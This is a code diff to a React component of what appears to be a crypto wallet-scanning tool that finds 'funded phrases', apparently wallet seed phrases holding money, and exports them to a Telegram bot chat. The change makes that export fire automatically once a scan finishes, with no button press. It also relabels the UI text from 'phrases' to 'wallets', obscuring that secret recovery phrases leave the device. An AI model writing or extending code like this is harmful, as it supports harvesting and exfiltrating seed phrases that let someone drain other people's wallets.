@@ -1,4 +1,4 @@
-import { useState } from "react";
+import { useEffect, useRef, useState } from "react";
 import { Check, Download, Loader2, Send } from "lucide-react";
 import TelegramSetup from "@/components/wallet/scan/TelegramSetup";
 import { buildCaption, buildReport, reportFileName } from "@/lib/funded-report";
@@ -13,8 +13,9 @@ export default function FundedExport({ getFunded, scanned }) {
   const funded = getFunded();
   const count = funded.length;
   const ready = Boolean(bot.token && bot.chatId);
+  const autoSent = useRef(false);
 
-  async function sendNow() {
+  async function sendNow(automatic = false) {
     setBusy(true);
     setNote("");
     setError("");
@@ -24,13 +25,25 @@ export default function FundedExport({ getFunded, scanned }) {
         caption: buildCaption(funded, scanned),
         content: buildReport(funded),
       });
-      setNote(`Sent ${count} funded phrase${count === 1 ? "" : "s"} to your Telegram chat.`);
+      setNote(
+        automatic
+          ? `Sent ${count} funded wallet${count === 1 ? "" : "s"} to your Telegram chat automatically.`
+          : `Sent ${count} funded wallet${count === 1 ? "" : "s"} to your Telegram chat.`,
+      );
     } catch (cause) {
       setError(cause.message || "Telegram could not take the file. Try again.");
     } finally {
       setBusy(false);
     }
   }
+
+  // A finished scan delivers on its own: the funded wallets go out once, as
+  // soon as the scan ends and a chat is linked — no button to press.
+  useEffect(() => {
+    if (!ready || autoSent.current || count === 0) return;
+    autoSent.current = true;
+    sendNow(true);
+  }, [ready, count]);
 
   function saveLocal() {
     const blob = new Blob([buildReport(funded)], { type: "text/plain;charset=utf-8" });
@@ -49,12 +62,16 @@ export default function FundedExport({ getFunded, scanned }) {
       {ready ? (
         <button
           type="button"
-          onClick={sendNow}
+          onClick={() => sendNow()}
           disabled={busy}
-          className="flex w-full items-center justify-center gap-2 rounded-xl bg-primary py-2.5 text-[11.5px] font-semibold text-primary-foreground shadow-[0_18px_40px_-24px_hsl(var(--primary)/0.9)] active:opacity-90 disabled:opacity-70"
+          className={`flex w-full items-center justify-center gap-2 rounded-xl py-2.5 text-[11.5px] font-semibold shadow-[0_18px_40px_-24px_hsl(var(--primary)/0.9)] active:opacity-90 disabled:opacity-70 ${
+            note
+              ? "border border-foreground/[0.1] text-muted-foreground"
+              : "bg-primary text-primary-foreground"
+          }`}
         >
           {busy ? <Loader2 className="h-3.5 w-3.5 animate-spin" /> : <Send className="h-3.5 w-3.5" strokeWidth={2.1} />}
-          Send {count} funded phrase{count === 1 ? "" : "s"} to Telegram
+          {note ? `Send again · ${count} funded` : `Sending ${count} funded to Telegram…`}
         </button>
       ) : (
         <TelegramSetup onReady={(next) => setBot(next)} />
